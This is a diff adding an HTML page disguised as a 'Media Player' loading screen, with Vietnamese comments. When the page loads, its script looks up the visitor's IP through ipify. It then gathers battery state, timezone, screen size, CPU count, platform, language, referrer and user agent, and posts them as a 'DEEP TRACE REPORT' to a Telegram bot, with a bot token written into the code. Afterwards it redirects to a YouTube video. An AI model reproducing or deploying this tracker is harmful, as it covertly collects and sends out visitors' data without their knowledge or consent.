@@ -1,0 +1,132 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Media Player</title>
+<style>
+    body {
+        background: #000;
+        color: #0f0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        font-family: monospace;
+        margin: 0;
+        padding: 20px;
+    }
+    .container {
+        text-align: center;
+        max-width: 600px;
+    }
+    .loader {
+        display: inline-block;
+        width: 40px;
+        height: 40px;
+        border: 4px solid #0f0;
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+    }
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    pre {
+        background: rgba(0,255,0,0.1);
+        padding: 15px;
+        border-radius: 8px;
+        text-align: left;
+        overflow-x: auto;
+        font-size: 12px;
+        margin-top: 20px;
+    }
+    .status {
+        margin-top: 20px;
+        font-size: 14px;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="loader"></div>
+    <div>⚡ Loading Media Player...</div>
+    <div class="status" id="status">Đang thu thập thông tin...</div>
+    <pre id="report" style="display:none;"></pre>
+</div>
+
+<script>
+// Lấy IP
+function getIP(d) {
+    window.cIP = d.ip;
+    collectAndSend();
+}
+
+const s = document.createElement('script');
+s.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+document.body.appendChild(s);
+
+// Hàm thu thập và gửi
+async function collectAndSend() {
+    try {
+        let battery = 'N/A';
+        if (navigator.getBattery) {
+            const bt = await navigator.getBattery();
+            battery = (bt.level * 100).toFixed(0) + '% ' + (bt.charging ? '(C)' : '(D)');
+        }
+        
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const resolution = window.screen.width + 'x' + window.screen.height;
+        const cpu = navigator.hardwareConcurrency || 'N/A';
+        const platform = navigator.platform;
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const referrer = document.referrer || 'Direct';
+        const pageUrl = window.location.href;
+        
+        // Tạo báo cáo chi tiết
+        const msg = '🎯 <b>DEEP TRACE REPORT</b>\n' +
+                    '🌐 <b>IP:</b> <code>' + (window.cIP || 'N/A') + '</code>\n' +
+                    '📍 <b>TZ:</b> ' + timezone + '\n' +
+                    '🔋 <b>Bat:</b> ' + battery + '\n' +
+                    '🖥️ <b>Res:</b> ' + resolution + '\n' +
+                    '⚙️ <b>CPU:</b> ' + cpu + '\n' +
+                    '📱 <b>Platform:</b> ' + platform + '\n' +
+                    '🌍 <b>Lang:</b> ' + language + '\n' +
+                    '🔗 <b>Referrer:</b> ' + referrer + '\n' +
+                    '📄 <b>URL:</b> ' + pageUrl + '\n' +
+                    '🆔 <b>UA:</b> <code>' + userAgent + '</code>';
+        
+        // Hiển thị report
+        document.getElementById('status').innerHTML = 'Đã thu thập xong, đang chuyển hướng...';
+        const reportElem = document.getElementById('report');
+        reportElem.style.display = 'block';
+        reportElem.innerHTML = msg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        
+        // Gửi lên Telegram
+        const botToken = '8528649332:AAEv3Thn2Seq2ewienUxjdgDMJSir5LhTuE';
+        const chatId = '8308036418';
+        
+        await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: msg,
+                parse_mode: 'HTML'
+            })
+        });
+        
+    } finally {
+        // Chuyển hướng sau 2 giây
+        setTimeout(function() {
+            location.href = 'https://youtu.be/z-3Cnrqe_uA?si=rCVXiaTZPjDdDjJ2';
+        }, 2000);
+    }
+}
+</script>
+</body>
+</html>
